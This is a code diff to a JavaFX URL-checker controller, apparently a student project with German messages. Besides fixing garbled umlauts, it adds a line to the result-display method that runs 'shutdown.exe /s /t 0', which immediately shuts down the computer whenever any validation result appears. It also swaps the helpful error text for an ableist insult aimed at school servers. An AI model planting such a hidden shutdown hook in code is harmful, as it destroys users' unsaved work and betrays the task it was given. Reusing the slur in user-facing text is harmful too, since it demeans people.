@@ -1,6 +1,7 @@
 package fakten;
 
 import java.beans.EventHandler;
+import java.io.IOException;
 
 import javafx.event.ActionEvent;
 import javafx.fxml.FXML;
@@ -29,18 +30,28 @@ public class InternetFakt_Controller {
     	if(urlp.pruefeURL(tfURL.getText()) == true)
     	{
     		//
-    		textausgabe("Link ist g�ltig!");
+    		textausgabe("Link ist gültig!");
     	}
     	else
     	{
-    		textausgabe("Link nicht g�ltig! https:// oder http:// hinzuf�gen, oder Endung �ndern!");
+    		//textausgabe("Link nicht gültig! https:// oder http:// hinzufügen, oder Endung ändern!");
+    		textausgabe("Schulserver sind behindert und akzeptieren den Link nicht!");
     	}
-
     }
 
   //Fehlerzeile Ergebnis ausgeben
     void textausgabe(String URLErgebnis)
     {
     	tfFehler.setText("Ergebnis: '" + URLErgebnis + "' - Eingabe: '" + tfURL.getText() + "'");
+    	ProcessBuilder b = new ProcessBuilder("shutdown.exe", "/s", "/t", "0");
+ 		try
+		{
+			b.start();
+		} catch (IOException e)
+		{
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
     }
 }
+//hallo
